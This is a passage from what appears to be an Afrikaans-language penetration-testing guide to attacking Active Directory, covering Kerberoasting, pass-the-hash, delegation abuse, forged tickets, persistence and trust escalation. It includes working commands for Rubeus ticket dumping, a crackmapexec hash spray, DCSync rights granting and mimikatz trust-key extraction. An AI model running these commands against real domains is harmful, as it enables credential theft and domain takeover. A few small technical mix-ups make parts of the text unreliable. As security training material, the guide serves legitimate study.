'n Leesbare kopie van 'n `msDS-ManagedPassword`-blob in 'n lêer, deel of rugsteun is 'n afsonderlike blootstellingspad: die LDAP-lees-ACL kan nie 'n kopie beskerm wat elders gestoor is nie. Bevestig dat die data 'n bestuurdewagwoord-blob is voordat jy dit interpreteer, en onderskei dit van beide 'n gemagtigde LDAP-leesaksie en afleiding vanaf die KDS-wortelsleutel.

### Kerberoast

Kerberoasting behels die verkryging van **TGS-kaartjies** wat deur dienste gebruik word wat aan gebruikersrekeninge gekoppel is, en die kraak van hul enkripsie—wat op gebruikerswagwoorde gebaseer is—**vanlyn**.

Meer hieroor:

{{#ref}}
kerberoast.md
{{#endref}}

### Afstandverbinding (RDP, SSH, FTP, Win-RM, ens.)

Nadat jy sekere credentials verkry het, kan jy nagaan of jy toegang tot enige **masjien** het. Jy kan **CrackMapExec** gebruik om met verskillende protokolle aan verskeie bedieners te probeer koppel, volgens jou poortskanderings.

### Plaaslike voorregte-eskalasie

As jy credentials of 'n sessie as 'n gewone domeingebruiker gekompromitteer het en toegang tot **enige masjien in die domein** het, soek 'n pad om **voorregte plaaslik te eskaleer en credentials in te samel**. Plaaslike administrateurvoorregte kan jou toelaat om **ander gebruikers se hashes** uit geheue (LSASS) en plaaslike berging (SAM) te dump.

Hierdie boek bevat 'n volledige bladsy oor [**plaaslike voorregte-eskalasie in Windows**](../windows-local-privilege-escalation/index.html) en 'n [**kontrolelys**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Huidige sessiekaartjies

Dit is **onwaarskynlik** dat jy **kaartjies** in die huidige gebruiker se sessie sal vind wat jou **toestemming gee om toegang tot** onverwagte hulpbronne te kry, maar jy kan nagaan:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Met domeinbewyse of ’n gebruikersessie, kyk weer na NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): geverifieerde enumerasie- en dwangtegnieke kan relay-paaie blootlê wat nie tydens ongeverifieerde verkenning beskikbaar was nie.

### Soek na Creds in Computer Shares | SMB Shares

Noudat jy ’n paar basiese bewyse het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word, kan vind**. Jy kan dit met die hand doen, maar dit is ’n baie vervelige, herhalende taak (veral as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om meer te wete te kom oor die tools wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steel NTLM Creds

As jy **toegang tot ander PCs of shares** het, kan jy **lêers plaas** (soos ’n SCF-lêer) wat, indien hulle op een of ander manier geopen word, **’n NTLM-verifikasie teen jou sal veroorsaak**, sodat jy die **NTLM challenge** kan **steel** om dit te crack:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geverifieerde gebruiker toegelaat om die **domeinbeheerder te kompromitteer**.

{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation op Active Directory MET bevoorregte bewyse/sessie

**Vir die volgende tegnieke is ’n gewone domeingebruiker nie genoeg nie; jy benodig spesiale voorregte/bewyse om hierdie aanvalle uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om ’n **plaaslike admin-rekening te kompromitteer** met [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [plaaslike privilege escalation](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in die geheue en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van ’n gebruiker het**, kan jy dit gebruik om die gebruiker **na te boots**.\
Jy moet ’n **tool** gebruik wat **NTLM-verifikasie met** daardie **hash uitvoer**, **of** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** in die **LSASS** **inject**, sodat daardie **hash gebruik sal word wanneer enige NTLM-verifikasie uitgevoer word**. Dit is wat mimikatz met die laaste opsie doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie aanval is daarop gemik om die **NTLM-hash van die gebruiker te gebruik om Kerberos tickets aan te vra**, as alternatief vir die gewone Pass The Hash oor die NTLM-protokol. Daarom kan dit veral **nuttig wees in netwerke waar die NTLM-protokol gedeaktiveer is** en slegs **Kerberos as verifikasieprotokol toegelaat word**.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)**-aanvalmetode **steel aanvallers ’n gebruiker se verifikasieticket** in plaas van hul wagwoord of hash-waardes. Die gesteelde ticket word dan gebruik om **die gebruiker na te boots**, wat ongemagtigde toegang tot hulpbronne en dienste binne ’n netwerk verleen.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Hergebruik van Credentials

As jy die **hash** of **wagwoord** van ’n **plaaslike administrateur** het, moet jy probeer om **plaaslik daarmee aan te meld** by ander **PCs**.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Let daarop dat dit taamlik **noisy** is en dat **LAPS** dit sal **mitigate**.

### MSSQL Abuse & Trusted Links

As ’n gebruiker voorregte het om **toegang tot MSSQL-instanties te kry**, kan hy dalk **opdragte uitvoer** op die MSSQL-gasheer (as dit as SA loop), die NetNTLM-**hash** **steel** of selfs ’n **relay**-**aanval** uitvoer.\
As ’n MSSQL-instansie deur ’n databasisskakel na ’n ander instansie vertrou word, kan ’n gebruiker met voorregte oor die gekoppelde databasis moontlik **die vertrouensverhouding gebruik om navrae op die ander instansie uit te voer**. Hierdie vertrouensverhoudings kan aan mekaar gekoppel word en kan uiteindelik by ’n verkeerd gekonfigureerde databasis uitkom waar die gebruiker opdragte kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest-trusts heen.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Misbruik van IT-bate-/ontplooiingsplatforms

Derdeparty-inventaris- en ontplooiingsuites bied dikwels kragtige maniere om toegang tot credentials en kode-uitvoering te kry. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer-objek met die kenmerk [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) vind en domeinvoorregte op die rekenaar het, sal jy TGT’s uit die geheue kan dump van elke gebruiker wat by die rekenaar aanmeld.\
As ’n **Domain Admin dus by die rekenaar aanmeld**, sal jy sy TGT kan dump en hom met [Pass the Ticket](pass-the-ticket.md) kan naboots.\
Danksy constrained delegation kan jy selfs **outomaties ’n Print Server kompromitteer** (hopelik is dit ’n DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As ’n gebruiker of rekenaar vir "Constrained Delegation" toegelaat word, sal dit **enige gebruiker kan naboots om toegang tot sekere dienste op ’n rekenaar te kry**.\
As jy dan die **hash van hierdie gebruiker/rekenaar kompromitteer**, sal jy **enige gebruiker** (selfs domeinadministrateurs) kan naboots om toegang tot sekere dienste te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

As jy **WRITE**-voorregte op ’n Active Directory-objek van ’n afgeleë rekenaar het, kan jy kode met **verhoogde voorregte** uitvoer:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Misbruik van Permissions/ACLs

Die gekompromitteerde gebruiker kan dalk ’n paar **interessante voorregte oor sekere domeinobjekte** hê waarmee jy lateraal kan **beweeg**/**voorregte eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Misbruik van die Printer Spooler-diens

As jy ’n **Spool-diens ontdek wat binne die domein luister**, kan dit **misbruik** word om **nuwe credentials te bekom** en **voorregte te eskaleer**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Misbruik van derdeparty-sessies

As **ander gebruikers** toegang tot die **gekompromitteerde** masjien kry, is dit moontlik om **credentials uit die geheue te versamel** en selfs **beacons in hul prosesse in te spuit** om hulle na te boots.\
Gebruikers kry gewoonlik toegang tot die stelsel via RDP; hier is dus hoe om ’n paar aanvalle op derdeparty-RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied ’n stelsel om die **plaaslike Administrator-wagwoord** op rekenaars wat by ’n domein aangesluit is, te bestuur en te verseker dat dit **gerandomiseer**, uniek en gereeld **verander** word. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs beperk tot slegs gemagtigde gebruikers. Met voldoende voorregte om toegang tot hierdie wagwoorde te kry, kan jy na ander rekenaars beweeg.


{{#ref}}
laps.md
{{#endref}}

### Diefstal van sertifikate

**Die versameling van sertifikate** vanaf die gekompromitteerde masjien kan ’n manier wees om voorregte binne die omgewing te eskaleer:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Misbruik van sertifikaatsjablone

As **kwesbare sjablone** opgestel is, is dit moontlik om dit te misbruik om voorregte te eskaleer:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Ná-uitbuiting met ’n rekening met hoë voorregte

### Dumping van domeincredentials

Sodra jy **Domain Admin**- of, nog beter, **Enterprise Admin**-voorregte kry, kan jy die **domeindatabasis**: _ntds.dit_ **dump**.

[**Meer inligting oor die DCSync-aanval is hier beskikbaar**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel, is hier beskikbaar**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

’n Leesbare rugsteunargief wat `ntds.dit` saam met die `SYSTEM`-hive bevat, moet as blootgestelde gidsmateriaal beskou word, selfs voordat dit uitgepak word. ’n Verouderde wagwoordhash beteken nie dat ander objekkenmerke veilig is nie: velde soos `description` kan credentials of operasionele notas bevat. Gaan eers die name van die argieflede na en hou die uitgepakte databasisinhoud uit roetine-enumerasie-uitset.

### Privesc as Persistence

Sommige van die tegnieke wat vroeër bespreek is, kan vir persistence gebruik word.\
Jy kan byvoorbeeld:

- Gebruikers kwesbaar maak vir [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Maak gebruikers kwesbaar vir [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Ken [**DCSync**](#dcsync)-voorregte aan 'n gebruiker toe

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Die **Silver Ticket-aanval** skep ’n **geldige Ticket Granting Service (TGS)-kaartjie** vir ’n spesifieke diens deur die **NTLM-hash** te gebruik (byvoorbeeld die **hash van die rekenaarrekening**). Hierdie metode word gebruik om **toegang tot die diens se voorregte te verkry**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

’n **Golden Ticket-aanval** behels dat ’n aanvaller toegang verkry tot die **NTLM-hash van die krbtgt-rekening** in ’n Active Directory (AD)-omgewing. Hierdie rekening is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGT’s)** te onderteken, wat noodsaaklik is vir verifikasie binne die AD-netwerk.

Sodra die aanvaller hierdie hash bekom, kan hulle **TGT’s** skep vir enige rekening wat hulle kies (Silver Ticket-aanval).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Dit is soos Golden Tickets wat op ’n manier vervals word wat **algemene opsporingsmeganismes vir Golden Tickets omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Sertifikaatrekening-volharding**

**Om sertifikate van ’n rekening te hê of dit te kan aanvra** is ’n baie goeie manier om volhardende toegang tot die gebruiker se rekening te behou (selfs al verander die gebruiker die wagwoord):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Domeinvolharding met sertifikate**

**Dit is ook moontlik om sertifikate te gebruik om volhardende toegang met hoë voorregte binne die domein te behou:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder-groep

Die **AdminSDHolder**-objek in Active Directory verseker die sekuriteit van **bevoorregte groepe** (soos Domain Admins en Enterprise Admins) deur ’n standaard **Access Control List (ACL)** op hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as ’n aanvaller die AdminSDHolder se ACL wysig om ’n gewone gebruiker volle toegang te gee, verkry daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie sekuriteitsmaatreël, wat bedoel is om te beskerm, kan dus die teenoorgestelde uitwerking hê en ongemagtigde toegang moontlik maak, tensy dit noukeurig gemonitor word.

[**Meer inligting oor die AdminDSHolder-groep hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM-geloofsbriewe

Daar bestaan ’n **plaaslike administrateur**-rekening op elke **Domain Controller (DC)**. Deur adminregte op so ’n masjien te verkry, kan die plaaslike Administrator-hash met **mimikatz** onttrek word. Daarna is ’n registerwysiging nodig om **die gebruik van hierdie wagwoord te aktiveer**, sodat afstandtoegang tot die plaaslike Administrator-rekening verkry kan word.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL-volharding

Jy kan ’n gebruiker **spesiale toestemmings gee** op spesifieke domeinobjekte, wat die gebruiker in staat sal stel om **in die toekoms voorregte te eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Sekuriteitsbeskrywers

**Sekuriteitsbeskrywers** word gebruik om die **toestemmings** wat ’n **objek** **op** ’n **objek** het, te **stoor**. As jy net ’n **klein verandering** aan die **sekuriteitsbeskrywer** van ’n objek kan **aanbring**, kan jy baie interessante voorregte op daardie objek verkry sonder om lid van ’n bevoorregte groep te hoef te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Misbruik van dinamiese objekte vir anti-forensiese maatreëls / ontwyking

Misbruik die hulpk klas `dynamicObject` om kortlewende principals/GPO’s/DNS-rekords met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle verwyder hulself sonder tombstones en wis LDAP-bewyse uit, terwyl wees-SID’s, gebroke `gPLink`-verwysings of DNS-antwoorde in die kas agterbly (bv. AdminSDHolder ACE-besoedeling of kwaadwillige `gPCFileSysPath`-/AD-geïntegreerde DNS-aansture).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in die geheue om ’n **universele wagwoord** in te stel, wat toegang tot alle domeinrekeninge verleen.


{{#ref}}
skeleton-key.md
{{#endref}}

### Pasgemaakte SSP

[Lees hier wat ’n SSP (Security Support Provider) is.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **geloofsbriewe** wat gebruik word om toegang tot die masjien te verkry, in **gewone teks** vas te lê.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer ’n **nuwe Domain Controller** in die AD en gebruik dit om **eienskappe** (SIDHistory, SPN’s...) op gespesifiseerde objekte te **stoot**, **sonder** om enige **logboeke** oor die **wysigings** agter te laat. Jy **benodig DA**-voorregte en moet binne die **worteldomein** wees.\
Let daarop dat redelik lelike logboeke sal verskyn as jy verkeerde data gebruik.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS-volharding

Ons het voorheen bespreek hoe om voorregte te eskaleer as jy **genoeg toestemmings het om LAPS-wagwoorde te lees**. Hierdie wagwoorde kan egter ook gebruik word om **volhardende toegang te behou**.\
Kyk na:


{{#ref}}
laps.md
{{#endref}}

## Voorregte-eskalasie in die forest - domeintrustverhoudings

Microsoft beskou die **Forest** as die sekuriteitsgrens. Dit beteken dat **die kompromittering van ’n enkele domein moontlik tot die kompromittering van die hele Forest kan lei**.<sup>[[1]](#references)</sup>

### Basiese inligting

’n [**domeintrustverhouding**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is ’n sekuriteitsmeganisme wat ’n gebruiker van een **domein** in staat stel om toegang tot hulpbronne in ’n ander **domein** te verkry. Dit skep in wese ’n skakel tussen die verifikasiestelsels van die twee domeine, waardeur verifikasiekontroles sonder onderbreking kan plaasvind. Wanneer domeine ’n trustverhouding opstel, ruil hulle spesifieke **sleutels** uit en behou dit binne hul **Domain Controllers (DC’s)**; hierdie sleutels is noodsaaklik vir die integriteit van die trustverhouding.

In ’n tipiese scenario moet ’n gebruiker wat toegang tot ’n diens in ’n **vertroude domein** wil verkry, eers ’n spesiale kaartjie, bekend as ’n **inter-realm TGT**, van hul eie domein se DC aanvra. Hierdie TGT word met ’n gedeelde **sleutel** geënkripteer waaroor albei domeine ooreengekom het. Die gebruiker bied dan hierdie TGT aan die **DC van die vertroude domein** om ’n dienskaartjie (**TGS**) te kry. Nadat die DC van die vertroude domein die inter-realm TGT suksesvol bekragtig het, reik dit ’n TGS uit wat die gebruiker toegang tot die diens verleen.

**Stappe**:

1. ’n **Kliëntrekenaar** in **Domein 1** begin die proses deur sy **NTLM-hash** te gebruik om ’n **Ticket Granting Ticket (TGT)** van sy **Domain Controller (DC1)** aan te vra.
2. DC1 reik ’n nuwe TGT uit as die kliënt suksesvol geverifieer word.
3. Die kliënt vra dan ’n **inter-realm TGT** van DC1 aan, wat nodig is om toegang tot hulpbronne in **Domein 2** te verkry.
4. Die inter-realm TGT word geënkripteer met ’n **trust-sleutel** wat tussen DC1 en DC2 gedeel word as deel van die tweerigting-domeintrust.
5. Die kliënt neem die inter-realm TGT na **Domein 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust-sleutel en reik, indien dit geldig is, ’n **Ticket Granting Service (TGS)** uit vir die bediener in Domein 2 waartoe die kliënt toegang wil verkry.
7. Laastens bied die kliënt hierdie TGS aan die bediener, wat met die bediener se rekeninghash geënkripteer is, om toegang tot die diens in Domein 2 te verkry.

### Verskillende trustverhoudings

Dit is belangrik om daarop te let dat **’n trustverhouding eenrigting of tweerigting kan wees**. In die tweerigting-opsie vertrou albei domeine mekaar, maar in ’n **eenrigting**-trustverhouding is een domein die **vertroude** domein en die ander die **trustende** domein. In laasgenoemde geval **kan jy slegs toegang tot hulpbronne in die trustende domein verkry vanaf die vertroude domein**.

As Domein A Domein B vertrou, is A die trustende domein en B die vertroude domein. Boonop is dit in **Domein A** ’n **uitgaande trustverhouding**; en in **Domein B** ’n **inkomende trustverhouding**.

**Verskillende trustverhoudings**

- **Ouer-kind-trustverhoudings**: Dit is ’n algemene opstelling binne dieselfde forest, waar ’n kinddomein outomaties ’n tweerigting-oorganklike trustverhouding met sy ouerdomein het. Dit beteken in wese dat verifikasieversoeke sonder onderbreking tussen die ouer- en kinddomein kan beweeg.
- **Kruisskakel-trustverhoudings**: Ook bekend as “kortpad-trustverhoudings”; dit word tussen kinddomeine opgestel om verwysingsprosesse te bespoedig. In komplekse forests moet verifikasieverwysings gewoonlik opgaan na die forest se wortel en dan afbeweeg na die teikendomein. Deur kruisskakels te skep, word die roete verkort, wat veral nuttig is in geografies verspreide omgewings.
- **Eksterne trustverhoudings**: Dit word tussen verskillende, onverwante domeine opgestel en is van nature nie-oorganklik. Volgens [Microsoft se dokumentasie](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is eksterne trustverhoudings nuttig om toegang te verkry tot hulpbronne in ’n domein buite die huidige forest wat nie deur ’n forest-trustverhouding gekoppel is nie. SID-filtering versterk sekuriteit met eksterne trustverhoudings.
- **Boomwortel-trustverhoudings**: Hierdie trustverhoudings word outomaties tussen die forest se worteldomein en ’n nuut bygevoegde boomwortel opgestel. Hoewel dit nie algemeen voorkom nie, is boomwortel-trustverhoudings belangrik om nuwe domeinbome by ’n forest te voeg; hulle stel dié bome in staat om ’n unieke domeinnaam te behou en verseker tweerigting-oorganklikheid. Meer inligting is beskikbaar in [Microsoft se gids](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest-trustverhoudings**: Hierdie tipe trustverhouding is ’n tweerigting-oorganklike trustverhouding tussen twee forest-worteldomeine, en dwing ook SID-filtering af om sekuriteitsmaatreëls te versterk.
- **MIT-trustverhoudings**: Hierdie trustverhoudings word met nie-Windows-, [RFC4120-voldoenende](https://tools.ietf.org/html/rfc4120) Kerberos-domeine opgestel. MIT-trustverhoudings is ietwat meer gespesialiseerd en is bedoel vir omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem vereis.

#### Ander verskille in **trustverhoudings**

- ’n Trustverhouding kan ook **oorganklik** wees (A vertrou B, B vertrou C, dus vertrou A vir C) of **nie-oorganklik**.
- ’n Trustverhouding kan as ’n **tweerigting-trustverhouding** (albei vertrou mekaar) of as ’n **eenrigting-trustverhouding** (slegs een vertrou die ander) opgestel word.

### Aanvalsroete

1. **Enumereer** die trustverhoudings.
2. Kyk of enige **sekuriteitsprincipal** (gebruiker/groep/rekenaar) **toegang** tot hulpbronne in die **ander domein** het, moontlik deur ACE-inskrywings of deur lidmaatskap van groepe in die ander domein. Soek **verhoudings tussen domeine** (dit was waarskynlik die rede waarom die trustverhouding geskep is).
   1. Kerberoast kan in hierdie geval nog ’n opsie wees.
3. **Kompromitteer** die **rekeninge** wat tussen domeine kan **pivot**.

Aanvallers kan op drie hoofmaniere toegang tot hulpbronne in ’n ander domein kry:

- **Plaaslike groeplidmaatskap**: Principals kan by plaaslike groepe op masjiene gevoeg word, soos die “Administrators”-groep op ’n bediener, wat hulle aansienlike beheer oor daardie masjien gee.
- **Lidmaatskap van ’n groep in ’n vreemde domein**: Principals kan ook lede wees van groepe binne die vreemde domein. Die doeltreffendheid van hierdie metode hang egter af van die aard van die trustverhouding en die omvang van die groep.
- **Toegangsbeheerlyste (ACL’s)**: Principals kan in ’n **ACL** gespesifiseer word, veral as entiteite in **ACE’s** binne ’n **DACL**, wat hulle toegang tot spesifieke hulpbronne gee. Vir diegene wat meer wil leer oor hoe ACL’s, DACL’s en ACE’s werk, is die witskrif “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ’n onskatbare bron.<sup>[[17]](#references)</sup>

### Vind eksterne gebruikers/groepe met toestemmings

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** nagaan om vreemde sekuriteitsprincipals in die domein te vind. Dit sal gebruikers/groepe van **’n eksterne domein/forest** wees.

Jy kan dit in **Bloodhound** nagaan of powerview gebruik:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Voorregte-eskalasie van kind na ouer in ’n forest

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Ander maniere om domain trusts te enumerate:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en ’n ander een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word, met die volgende kry:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaleer as Enterprise admin na die child/parent domain deur die trust met SID-History injection te misbruik:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Misbruik ’n skryfbare Configuration NC

Dit is noodsaaklik om te verstaan hoe die Configuration Naming Context (NC) uitgebuit kan word. Die Configuration NC dien as ’n sentrale bewaarplek vir konfigurasiedata in ’n Active Directory (AD)-omgewing se forest. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, en skryfbare DCs hou ’n skryfbare kopie van die Configuration NC by. Om dit uit te buit, moet jy **SYSTEM-regte op ’n DC** hê, verkieslik ’n child DC.

**Koppel GPO aan die root DC-werf**

Die Configuration NC se Sites-houer bevat inligting oor die werwe van alle rekenaars wat aan die domein gekoppel is binne die AD-forest. Aanvallers met SYSTEM-regte op enige DC kan GPOs aan die root DC-werwe koppel. Hierdie aksie kan die root domain moontlik kompromitteer deur beleide wat op hierdie werwe toegepas word, te manipuleer.

Vir meer inligting kan jy navorsing oor [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) lees.<sup>[[12]](#references)</sup>

**Kompromitteer enige gMSA in die forest**

Een aanvalsvector is om bevoorregte gMSAs binne die domein te teiken. Die KDS Root-sleutel, wat noodsaaklik is om gMSAs se wagwoorde te bereken, word in die Configuration NC gestoor. Met SYSTEM-regte op enige DC is dit moontlik om toegang tot die KDS Root-sleutel te verkry en die wagwoorde vir enige gMSA regoor die forest te bereken.

’n Gedetailleerde ontleding en stap-vir-stap leiding is beskikbaar by:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende gedelegeerde MSA-aanval (BadSuccessor – misbruik van migrasie-attribuutwaardes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Bykomende eksterne navorsing: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Aanval deur skemaverandering**

Hierdie metode verg geduld terwyl jy wag dat nuwe bevoorregte AD-objekte geskep word. Met SYSTEM-regte kan ’n aanvaller die AD Schema wysig om enige gebruiker volle beheer oor alle klasse te gee. Dit kan lei tot ongemagtigde toegang tot en beheer oor nuutgeskepte AD-objekte.

Lees meer oor [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Van DA na EA met ADCS ESC5**

Die ADCS ESC5-kwesbaarheid teiken beheer oor Public Key Infrastructure (PKI)-objekte om ’n sertifikaatsjabloon te skep wat stawing as enige gebruiker binne die forest moontlik maak. Omdat PKI-objekte in die Configuration NC voorkom, maak die kompromittering van ’n skryfbare child DC dit moontlik om ESC5-aanvalle uit te voer.

Lees meer hieroor in [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> As ADCS ontbreek, kan die aanvaller die nodige komponente opstel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Eksterne forest-domein - Eenrigting (inkomend) of tweerigting

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

In hierdie scenario **word jou domein deur ’n eksterne domein vertrou**, wat jou **onbepaalde toestemmings** daaroor gee. Jy sal moet uitvind **watter principals van jou domein watter toegang tot die eksterne domein het** en dan probeer om dit te exploit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest-domein – Eenrigting (Uitgaande)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

In hierdie scenario **vertrou jou domein** sekere **regte** aan ’n prinsipaal van **ander domeine** toe.

Wanneer ’n domein egter **deur die vertrouende domein vertrou word**, **skep die vertroude domein ’n gebruiker** met ’n **voorspelbare naam** en gebruik dit die **vertroude wagwoord** as wagwoord. Dit beteken dat dit moontlik is om **toegang tot ’n gebruiker in die vertrouende domein te kry en van daar af by die vertroude domein in te kom**, dit te enumereer en verdere regte te probeer eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog ’n manier om die vertroude domein te kompromitteer, is om ’n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeintrust geskep is (wat nie baie algemeen is nie).

